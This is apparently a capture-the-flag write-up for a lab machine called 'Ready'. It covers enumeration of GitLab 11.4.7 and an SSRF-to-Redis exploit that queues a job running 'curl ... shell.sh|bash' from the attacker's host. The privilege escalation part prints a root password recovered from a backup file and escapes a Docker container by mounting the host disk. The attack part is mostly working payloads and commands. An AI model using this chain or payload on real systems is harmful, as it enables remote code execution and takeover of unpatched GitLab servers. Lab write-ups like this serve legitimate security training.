# Ready

### Nmap

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Web Enum

```
http://10.10.10.220:5080/robots.txt

http://10.10.10.220:5080/users/sign_in -> gitlab login

http://10.10.10.220:5080/search -> search project

http://10.10.10.220:5080/help -> help doc

http://10.10.10.220:5080/projects -> http://10.10.10.220:5080/explore

http://10.10.10.220:5080/test -> test acc

http://10.10.10.220:5080/root -> administrator acc

GitLab Community Edition 11.4.7
```

### Exploitation

```bash
# obtain version after register
GitLab Community Edition 11.4.7

# request from target when cloning remote repo
GET /info/refs?service=git-upload-pack HTTP/1.1
Host: 10.10.14.29:12345
User-Agent: git/2.18.1
Accept: */*
Accept-Encoding: deflate, gzip
Pragma: no-cache

# exploit
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/ssrf.git

 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|curl http://10.10.14.29:9000/shell.sh|bash \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
 exec
```

### Priv Esc

```bash
# get root password from /opt/backup/gitlab.rb
wW59U!ZKMbG9+*#h

# switch to root
su root:wW59U!ZKMbG9+*#h

# mount shares to read flag
mount /dev/sda2 /mnt/sda2

# Docker container escapes
https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
```
